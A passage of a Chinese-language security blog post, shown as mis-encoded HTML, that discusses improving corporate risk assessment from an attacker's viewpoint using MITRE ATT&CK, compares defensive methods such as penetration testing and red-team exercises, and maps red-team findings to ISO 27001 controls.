  &lt;li&gt;æ§åˆ¶æªæ–½(Countermeasure)ï¼šç”¨ä¾†é™ä½ä¼æ¥­é¢è‡¨é¢¨éšªçš„æªæ–½ï¼Œä¾‹å¦‚ï¼šè³‡å®‰è¨­å‚™ã€ç®¡ç†åˆ¶åº¦ã€æ•™è‚²è¨“ç·´ç­‰ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç„¶è€Œï¼Œå¤šæ•¸ä¼æ¥­åœ¨è©•ä¼°ä¼æ¥­é¢¨éšªæ™‚ï¼Œç‚ºæ±‚æ–¹ä¾¿ï¼Œæœƒå°‡é¢¨éšªè©•é‘‘çš„åƒæ•¸ç°¡åŒ–æˆ {&lt;strong&gt;å¼±é»ã€æ©Ÿç‡ã€è³‡ç”¢åƒ¹å€¼&lt;/strong&gt;}ï¼Œå¿½ç•¥äº†èˆ‡æ•µäººç›¸é—œçš„åƒæ•¸ {å¨è„…ä¾†æºã€æ„åœ–ã€å¨è„…ã€æˆ°ç•¥åƒ¹å€¼}ï¼›æ¥ä¸‹ä¾†çš„å…©å€‹ä¾‹å­å°‡èªªæ˜å¿½ç•¥å¾Œé€ æˆé¢¨éšªè©•é‘‘çš„åå·®ï¼ŒåŒ…å«äº†&lt;strong&gt;è³‡ç”¢åƒ¹å€¼çš„è¼•å¿½&lt;/strong&gt;åŠ&lt;strong&gt;è¼•å¿½æ¼æ´åˆ©ç”¨çš„å¯èƒ½æ€§&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç¾å¯¦é¢¨éšªè©•é‘‘å¯èƒ½çš„åå·®&quot;&gt;ç¾å¯¦é¢¨éšªè©•é‘‘å¯èƒ½çš„åå·®&lt;/h2&gt;
&lt;h3 id=&quot;æ•µäººåœ¨æ„çš„æ˜¯æˆ°ç•¥åƒ¹å€¼è€Œä¸åƒ…æ˜¯è³‡ç”¢åƒ¹å€¼&quot;&gt;æ•µäººåœ¨æ„çš„æ˜¯æˆ°ç•¥åƒ¹å€¼è€Œä¸åƒ…æ˜¯è³‡ç”¢åƒ¹å€¼&lt;/h3&gt;

&lt;p&gt;é€éé¢¨éšªè©•é‘‘å¯ä»¥è­˜åˆ¥å‡ºè³‡ç”¢å¯èƒ½é¢è‡¨çš„é¢¨éšªï¼Œä¸¦ä¸”ä½œç‚ºé ç®—æˆ–è³‡æºæŠ•å…¥å„ªå…ˆé †åºçš„åƒè€ƒï¼Œä¸€èˆ¬å¯ä»¥åˆ†ç‚º 3 å€‹å„ªå…ˆç­‰ç´šï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;å„ªå…ˆè™•ç†ã€Œé«˜è¡æ“Šã€é«˜æ©Ÿç‡ã€ (é …æ¬¡ 1ã€é …æ¬¡ 2) çš„é¢¨éšªï¼šé€šå¸¸æ˜¯è¶…å‡ºä¼æ¥­å¯æ¥å—é¢¨éšªçš„å¨è„…ï¼Œè—‰ç”±æ§åˆ¶æªæ–½å°‡é¢¨éšªä¸‹é™åˆ°å¯æ¥å—çš„ç¨‹åº¦ï¼Œé€™éƒ¨åˆ†é€šå¸¸æ˜¯ä¼æ¥­è³‡æºå„ªå…ˆæˆ–æŒçºŒæŠ•å…¥çš„é‡é»ã€‚&lt;/li&gt;
  &lt;li&gt;æ¬¡ä¹‹æ˜¯ã€Œé«˜è¡æ“Šã€ä½æ©Ÿç‡ ã€(é …æ¬¡ 3ã€é …æ¬¡ 4)çš„é¢¨éšªï¼šæ­¤ç­‰ç´šæ˜¯å±¬æ–¼éœ€è¦æŒçºŒé—œæ³¨é¿å…å‡é«˜çš„é¢¨éšªï¼Œå¦‚æœä¼æ¥­é ç®—ä»æœ‰é¤˜è£•ï¼Œæ‡‰è©²æŠ•å…¥çš„ç¬¬äºŒå€‹ç­‰ç´šã€‚&lt;/li&gt;
  &lt;li&gt;æœ€å¾Œæ˜¯ã€Œä½è¡æ“Šã€ä½æ©Ÿç‡ ã€(é …æ¬¡ 5ã€é …æ¬¡ 6)çš„é¢¨éšªï¼šçœ‹èµ·ä¾†å°ä¼æ¥­ä¸æœƒæœ‰ç«‹å³å±å®³ï¼Œä¸€èˆ¬ä¸éœ€ç‰¹åˆ¥é—œæ³¨æˆ–æŠ•å…¥è³‡æºã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é …æ¬¡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è³‡ç”¢åç¨±&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;åƒ¹å€¼&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¨è„…&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¼±é»&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è¡æ“Š&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ©Ÿç‡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é¢¨éšª&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;äº¤æ˜“è³‡æ–™&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è“„æ„ç ´å£&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å»ºç¯‰ç‰©ç®¡åˆ¶ä¸è¶³&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç”¨æˆ¶å€‹è³‡&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å‹’è´–è»Ÿé«”åŠ å¯†&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç„¡æ³•ä¸Š patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è½‰å¸³ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è»Ÿé«”å¤±æ•ˆ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;é­åˆ° DDoS æ”»æ“Š&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;18&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ ¸å¿ƒç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è»Ÿé«”å¤±æ•ˆ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç¶­è­·æœå‹™æ™‚é–“éé•·&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç‰ˆæœ¬æ›´æ–°ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æœªç¶“æˆæ¬Šå­˜å–&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ©«å‘ç§»å‹•&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å…§éƒ¨å·®å‹¤ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç³»çµ±å…¥ä¾µ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç„¡æ³•ä¸Š patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ç„¶è€Œï¼Œå°æ•µäººè€Œè¨€ï¼Œé¸æ“‡æ¬²æ”»ä¸‹çš„ç˜é ­å ¡æ™‚ï¼Œçœ‹é‡çš„æ˜¯&lt;strong&gt;è³‡ç”¢çš„æˆ°ç•¥åƒ¹å€¼&lt;/strong&gt;ï¼Œè€Œèˆ‡è³‡ç”¢æœ¬èº«çš„åƒ¹å€¼æ²’æœ‰å¿…ç„¶çš„é—œä¿‚ï¼Œå¦‚ä¸Šè¡¨é …æ¬¡ 6 çš„å…§éƒ¨å·®å‹¤ç³»çµ±å¦‚æœæ˜¯èƒ½ä¸²æ¥åˆ°æ•µäººä¸»è¦çš„æ¨™çš„ï¼Œå°ä»–ä¾†èªªå°±æ˜¯ä¸€å€‹å¿…å®šæœƒè¨­æ³•å–å¾—æ§åˆ¶æ¬Šçš„è³‡ç”¢ï¼Œè€Œé€™æ™‚å¯ä»¥ç™¼ç¾ç¶“ç”±ç°¡åŒ–ç‰ˆçš„é¢¨éšªè©•é‘‘ä¸¦ä¸å®¹æ˜“å‘ˆç¾é€™å€‹è³‡ç”¢æ‰€é¢è‡¨çš„é¢¨éšªã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä½ä¼°å¼±é»å¯åˆ©ç”¨æ©Ÿç‡&quot;&gt;ä½ä¼°å¼±é»å¯åˆ©ç”¨æ©Ÿç‡&lt;/h3&gt;
&lt;p&gt;é˜²å®ˆæ–¹åœ¨ä½¿ç”¨åˆ†éšªè©•é‘‘æ™‚ï¼Œå¦ä¸€å€‹å•é¡Œæ˜¯ç„¡æ³•æº–ç¢ºçš„ä¼°è¨ˆå¼±é»çš„å¯åˆ©ç”¨æ©Ÿç‡ï¼Œé›–ç„¶å¸‚é¢ä¸Šå·²ç¶“æœ‰è¨±å¤šå¼±é»ç®¡ç†è»Ÿé«”å¯ä»¥å”åŠ©ï¼Œä½†é¢å°çœŸå¯¦æ”»æ“Šæ™‚ï¼Œæ•µäººä¸æœƒåªåˆ©ç”¨å·²çŸ¥çš„æ¼æ´æˆ–æ˜¯ OWASP TOP10ï¼Œç”šè‡³è‡ªè¡Œç ”ç™¼ 0-dayã€‚å› æ­¤ï¼Œç•¶ä¼æ¥­å·²ç¶“é€²è¡Œä¸€å®šç¨‹åº¦çš„é˜²è­·æªæ–½å¾Œï¼Œå¦‚æœä¸æ›¾ç¶“æ­·è³‡å®‰äº‹æ•…æˆ–ç¼ºä¹æ­£ç¢ºçš„èªçŸ¥ï¼Œå¾€å¾€èªç‚ºæ‡‰è©²ä¸æœƒæœ‰é€™éº¼å²å®³çš„é§­å®¢å¯ä»¥çªç ´æ—¢æœ‰çš„é˜²è­·æªæ–½ï¼Œä½†å¾æ­·ä¾†çš„è³‡å®‰äº‹æ•…åŠæˆ‘å€‘æœå‹™çš„ç¶“é©—å‘Šè¨´æˆ‘å€‘ï¼Œå…¶å¯¦é›»å½±è£¡é¢æ¼”çš„éƒ½æ˜¯çœŸçš„ï¼ï¼&lt;/p&gt;

&lt;h2 id=&quot;å¾æ”»æ“Šè€…çš„è§’åº¦æ”¹å–„é¢¨éšªè©•é‘‘&quot;&gt;å¾æ”»æ“Šè€…çš„è§’åº¦æ”¹å–„é¢¨éšªè©•é‘‘&lt;/h2&gt;
&lt;p&gt;å¾ˆå¤šäººä»¥ç‚ºæ”»æ“Šè€…çš„è§’åº¦æŒ‡çš„æ˜¯æ¼æ´æŒ–æ˜ï¼Œå…¶å¯¦ä¸¦ä¸å…¨ç„¶ã€‚æ”»æ“Šè€…å°æ–¼æƒ³ç«Šå–çš„è³‡ç”¢ï¼Œä¹Ÿæ˜¯ç¶“éç¸å¯†çš„è¦åŠƒåŠåï½è¦†ï½è§€ï½å¯Ÿï½ï¼Œä»–å€‘ä¸€æ¨£æœ‰ç­–ç•¥ã€æŠ€æ³•è·Ÿå·¥å…·ã€‚è€Œ &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK&lt;/a&gt; å°±æ˜¯ä¸€å€‹å°æ–¼å·²çŸ¥æ”»æ“Šç­–ç•¥åŠæŠ€å·§å…·å‚™å®Œæ•´å®šç¾©åŠæ”¶é›†çš„æ¡†æ¶ï¼Œå®ƒå¯ä»¥ç”¨ä¾†å”åŠ©å»ºç«‹å¨è„…æƒ…è³‡ (Threat Intelligence)ã€æ”¹å–„é˜²å®ˆæ–¹çš„åµæ¸¬åŠåˆ†æã€å¼·åŒ–æ¨¡æ“¬æ•µäººåŠç´…éšŠæ¼”ç·´ç­‰ï¼Œç›¸é—œçš„ä½¿ç”¨æ–¹å¼éƒ½åœ¨å…¶å®˜ç¶²ä¸Šå¯ä»¥æ‰¾åˆ°ï¼Œç´°ç¯€æˆ‘å€‘ä¸åœ¨é€™é‚Šä»‹ç´¹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥å°‡å·²ç¶“ç™¼ç”Ÿçš„è³‡å®‰äº‹æ•… (Incident) æˆ–ç´…éšŠæ¼”ç·´å°æ‡‰åˆ° ATT&amp;amp;CK Enterprise Framework ä¸­ï¼Œä¸¦ä¸”è©•ä¼°ç›®å‰æ‰€å»ºç½®çš„æ§åˆ¶æªæ–½æ˜¯å¦å¯ä»¥æ¸›ç·©ã€é˜»æ“‹æˆ–åµæ¸¬é€™äº›æŠ€å·§ã€‚ä»¥ä¸‹åœ–ç‚ºä¾‹ï¼Œæ·ºç¶ è‰²æ–¹å¡Šæ˜¯ç´…éšŠæ¼”ç·´æ‰€æ¡ç”¨çš„æŠ€å·§ã€ç´…è‰²æ–¹å¡Šå‰‡æ˜¯è³‡å®‰äº‹æ•…ä½¿ç”¨çš„æŠ€å·§ï¼Œä¼æ¥­å¯ä»¥åŒæ™‚æ¯”å°å¤šå€‹è³‡å®‰äº‹æ•…æˆ–æ˜¯ç´…éšŠæ¼”ç·´çš„çµæœï¼Œæ‰¾å‡ºäº¤é›†çš„æ·ºé»ƒè‰²å€å¡Šï¼Œå³æ˜¯ä¼æ¥­å¯ä»¥å„ªå…ˆå¼·åŒ–çš„æ§åˆ¶æªæ–½æˆ–æ˜¯é ç®—æ‡‰è©²æŠ•å…¥ä¹‹è™•ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™é‚Šæœ‰å€‹éœ€è¦ç‰¹åˆ¥æ³¨æ„çš„åœ°æ–¹ï¼ŒATT&amp;amp;CK Enterprise Framework ä½œç‚ºä¸€å€‹é©—è­‰é˜²å®ˆæ–¹æ§åˆ¶æªæ–½çš„æœ‰æ•ˆæ€§æ˜¯ä¸€å€‹éå¸¸å¥½çš„æ¡†æ¶ï¼Œç„¶è€Œä¸å»ºè­°åˆ©ç”¨é€™å€‹æ¡†æ¶çš„ç‰¹å®šæŠ€å·§ä½œç‚ºé™åˆ¶ç´…éšŠæ¼”ç·´çš„æƒ…å¢ƒï¼Œè¦è¨˜å¾—ã€Œç•¶ä½¿ç”¨ ATT&amp;amp;CK æ™‚è¦æ³¨æ„æœ‰å…¶åå·®ï¼Œé€™å¯èƒ½æœƒå°‡å·²çŸ¥çš„æ”»æ“Šè¡Œç‚ºå„ªå…ˆæ–¼æœªçŸ¥çš„æ”»æ“Šè¡Œç‚ºã€ï¼Œæ­£å¦‚åŒç´…éšŠæ¼”ç·´çš„ç²¾ç¥ï¼Œæ˜¯é€éç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„æ–¹å¼æ‰¾åˆ°å¯ä»¥æˆåŠŸçš„å…¥ä¾µæ–¹å¼ï¼Œå› æ­¤æˆ‘å€‘æœƒå»ºè­°çµ¦äºˆç´…éšŠæ¼”ç·´åœ˜éšŠæœ€è‡ªç”±çš„ç™¼æ®ç©ºé–“ï¼Œæ‰èƒ½çœŸæ­£æ‰¾å‡ºä¼æ¥­å¯èƒ½çš„ç›²é»ã€‚&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Remember any ATT&amp;amp;CK-mapped data has biases:Youâ€™re prioritizing known adversary behavior over the unknown.
ï¼ Katie Nickels, Threat Intelligence Lead @ The MITRE Corporation&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;æŒ‘é¸é©åˆçš„æ–¹æ³•æ”¹å–„é˜²ç¦¦ç­–ç•¥&quot;&gt;æŒ‘é¸é©åˆçš„æ–¹æ³•æ”¹å–„é˜²ç¦¦ç­–ç•¥&lt;/h2&gt;
&lt;p&gt;é‚£éº¼åœ¨æˆ‘å€‘äº†è§£æ•µäººæœƒä½¿ç”¨çš„ç­–ç•¥ã€æŠ€å·§ä¹‹å¾Œï¼Œä¼æ¥­è¦å¦‚ä½•æŒ‘é¸æ”¹å–„é˜²ç¦¦ç­–ç•¥çš„æ–¹æ³•ï¼Ÿç†æƒ³ä¸Šï¼Œæˆ‘å€‘å»ºè­°å¦‚æœé ç®—è¨±å¯ï¼Œ&lt;a href=&quot;https://devco.re/services/red-team#service-content-3&quot;&gt;é€™é¡å‹&lt;/a&gt;çš„ä¼æ¥­è‡³å°‘æ‡‰è©²åŸ·è¡Œä¸€æ¬¡é«˜å¼·åº¦çš„ç´…éšŠæ¼”ç·´ï¼Œä¾†å…¨é¢æ€§çš„ç›¤é»ä¼æ¥­é¢è‡¨çš„å¨è„…ï¼Œä½†ç¾å¯¦ä¸Šä¸¦éæ¯å€‹ä¼æ¥­éƒ½æœ‰è¶³å¤ çš„é ç®—ã€‚å› æ­¤ï¼Œåœ¨ä¸åŒçš„æ¢ä»¶ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ–¹æ³•ä¾†æ”¹å–„é˜²ç¦¦ç­–ç•¥ï¼Œæˆ‘å€‘å»ºè­°å¯ä»¥å¾ä»¥ä¸‹å¹¾å€‹å› ç´ é€²è¡Œè©•ä¼°ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æ™‚é–“ï¼šåŸ·è¡Œé€™å€‹æ–¹æ³•æ‰€éœ€è¦çš„æ™‚é–“ã€‚&lt;/li&gt;
  &lt;li&gt;æˆæœ¬ï¼šåˆ©ç”¨é€™å€‹æ–¹æ³•éœ€è¦ä»˜å‡ºçš„æˆæœ¬ (åŒ…å«é‡‘éŒ¢ã€åè²)ã€‚&lt;/li&gt;
  &lt;li&gt;çœŸå¯¦æ€§ï¼šæ‰€æ¡ç”¨çš„æ–¹æ³•æ˜¯å¦èƒ½çœŸå¯¦åæ˜ ç¾å¯¦çš„å¨è„…ã€‚&lt;/li&gt;
  &lt;li&gt;ç¯„åœï¼šæ‰€æ¡ç”¨çš„æ–¹æ³•èƒ½æ¶µè“‹ç¯„åœæ˜¯å¦è¶³ä»¥ä»£è¡¨ä¼æ¥­æ•´é«”ç‹€æ³ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€™é‚Šæˆ‘å€‘ä»¥é¢¨éšªè©•é‘‘ã€å¼±é»æƒæã€æ»²é€æ¸¬è©¦ã€æ¨¡æ“¬æ”»æ“Šã€ç´…éšŠæ¼”ç·´åŠè³‡å®‰äº‹ä»¶ä½œç‚ºæ”¹å–„é˜²ç¦¦ç­–ç•¥çš„æ–¹æ³•ï¼Œè€Œåˆ†åˆ¥å°±ä¸Šè¿°å…­å€‹é …ç›®çµ¦äºˆç›¸å°çš„åˆ†æ•¸ï¼Œä¸¦ä¸”ä¾ç…§&lt;strong&gt;çœŸå¯¦æ€§ã€ç¯„åœã€æˆæœ¬åŠæ™‚é–“ä½œç‚ºæ’åºçš„å„ªå…ˆåº&lt;/strong&gt;(é †åºä¾ä¼æ¥­çš„ç‹€æ³æœ‰æ‰€ä¸åŒï¼‰ã€‚è€Œæˆ‘å€‘æœƒé€™æ¨£æ’åºçš„åŸå› æ˜¯ï¼šä¸€å€‹å¥½çš„æ–¹æ³•æ‡‰è©²è¦&lt;strong&gt;èˆ‡çœŸå¯¦ä¸–ç•Œçš„æ”»æ“Šç›¸ä»¿&lt;/strong&gt;è€Œä¸”åœ¨æ•´å€‹éç¨‹ä¸Š&lt;strong&gt;è¶³ä»¥ç™¼ç¾ä¼æ¥­æ•´é«”è³‡å®‰çš„ç‹€æ³&lt;/strong&gt;ï¼Œæœ€å¾Œæ‰æ˜¯è€ƒæ…®æ‰€èŠ±è²»çš„æˆæœ¬åŠæ™‚é–“ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ–¹æ³•&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;çœŸå¯¦æ€§&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ç¯„åœ&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æˆæœ¬&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ™‚é–“&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;è³‡å®‰äº‹ä»¶&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç´…éšŠæ¼”ç·´&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ¨¡æ“¬æ”»æ“Š&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ»²é€æ¸¬è©¦&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å¼±é»æƒæ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;é¢¨éšªè©•é‘‘&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;åˆ°é€™è£¡ï¼Œé™¤äº†è³‡å®‰äº‹ä»¶å¤–ï¼Œå¤§è‡´å¯ä»¥æ±ºå®šè¦ç”¨ä¾†å”åŠ©è©•ä¼°é˜²ç¦¦ç­–ç•¥æ‰€æ‡‰è©²é¸æ“‡çš„æ–¹æ³•ã€‚æ›´é‡è¦çš„æ˜¯åœ¨ä½¿ç”¨é€™äº›æ–¹æ³•å¾Œï¼Œè¦å°‡çµæœåé¥‹å›é¢¨éšªè©•é‘‘ä¸­ï¼Œå› ç‚ºç›¸è¼ƒæ–¼å…¶ä»–æ–¹æ³•é¢¨éšªè©•é‘‘æ˜¯ä¸€å€‹æœ€ç°¡å–®ä¸”å»£æ³›çš„æ–¹æ³•ï¼Œé€™æœ‰åŠ©æ–¼ä¼æ¥­æŒçºŒå°‡è³‡æºæŠ•æ³¨åœ¨é‡å¤§çš„é¢¨éšªä¸Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ¡ˆä¾‹&quot;&gt;æ¡ˆä¾‹&lt;/h2&gt;
&lt;p&gt;æœ€å¾Œï¼Œæˆ‘å€‘ä»¥ä¸€å€‹ç´…éšŠæ¼”ç·´æ¡ˆä¾‹ä¸­æ‰€ç™¼ç¾æ§åˆ¶æªæ–½çš„ç–æ¼ï¼Œä¾†æ”¹å–„ä¼æ¥­çš„é¢¨éšªè©•é‘‘æ–¹å¼ã€‚åŒæ™‚ï¼Œæˆ‘å€‘å°‡å…¥ä¾µçš„æˆæœå°æ‡‰è‡³ ISO27001:2013 çš„æœ¬æ–‡è¦æ±‚åŠæ§åˆ¶é …ç›®ï¼Œé€™äº›é …ç›®å¯ä»¥è¦–ç‚ºä»¥æ”»æ“Šè€…çš„è§’åº¦ç¨½æ ¸ä¼æ¥­çš„ç®¡ç†åˆ¶åº¦ï¼Œæ›´èƒ½åæ˜ åˆ¶åº¦çš„è½å¯¦æƒ…å½¢ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é …ç›®&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;ç™¼ç¾&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;æœ¬æ–‡/é™„éŒ„&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æ ¸å¿ƒç³»çµ±ç›¤é»æœªå®Œæ•´&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æœ¬æ–‡ 4.3 æ±ºå®š ISMS ç¯„åœ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ç›£æ§ç¯„åœä¸è¶³&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æœ¬æ–‡ 4.2 é—œæ³¨æ–¹ä¹‹éœ€è¦èˆ‡æœŸæœ›&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ä¸åŒç³»çµ±ä½¿ç”¨ç›¸åŒå¸³è™Ÿå¯†ç¢¼&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.9.4.3 é€šè¡Œç¢¼ç®¡ç†ç³»çµ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ç®¡ç†å¸³è™Ÿå­˜åœ¨å¯†ç¢¼è¦å‰‡&lt;/td&gt;
